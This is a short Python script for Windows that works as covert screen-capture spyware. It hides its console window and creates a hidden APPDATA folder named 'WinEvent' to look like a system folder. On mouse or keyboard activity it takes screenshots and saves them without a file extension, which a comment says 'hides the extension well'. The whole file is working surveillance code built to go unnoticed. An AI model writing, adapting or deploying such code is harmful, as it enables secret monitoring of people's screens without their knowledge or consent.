from pynput.keyboard import Key, Listener

from pyautogui import screenshot, position
from threading import Thread
from time import sleep
from datetime import datetime
import win32gui
import win32console
import os
from os import getenv

mouse_position = ()
key_press_date = datetime.now()
last_screenshot_date = datetime.now()
path = getenv('APPDATA') + "\\WinEvent"


def Hide():
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)


def ScreenShot():
    temp = screenshot()
    # careful with this, don't go below 0.9
    # (width, height) = (temp.width * 0.9, temp.height * 0.9)
    # temp = temp.resize((int(width), int(height)))
    temp = temp.convert("L")
    # that hides the extension well
    temp.save(path + "\\" + datetime.now().strftime("%d%H%M%S"),
              "jpeg", optimize=True, quality=75)


def CheckForMouseActivity():
    while True:
        global mouse_position
        global last_screenshot_date
        sleep(5)
        # current mouse x and y
        if mouse_position != position() \
                or last_screenshot_date <= key_press_date:
            mouse_position = position()
            ScreenShot()
            last_screenshot_date = datetime.now()
        else:
            pass


def On_press(key):
    global key_press_date
    key_press_date = datetime.now()


def CheckForKeyActivity():
    with Listener(
            on_press=On_press) as listener:
        listener.join()


# def DeleteOnceItGetsTooBig():
#     sleep(10800)  # execute check every 3 hours
#     path # check size
#     # and delete if over 3 GB, make sure it doesn't move it to the bin
#     pass


Hide()

# if the directory doesn't exist, create it and set to hidden
if not os.path.exists(path):
    os.mkdir(path)
    os.system("attrib +h " + path)

if __name__ == '__main__':
    Thread(target=CheckForMouseActivity).start()
    Thread(target=CheckForKeyActivity).start()
    # Thread(target=DeleteOnceItGetsTooBig).start()
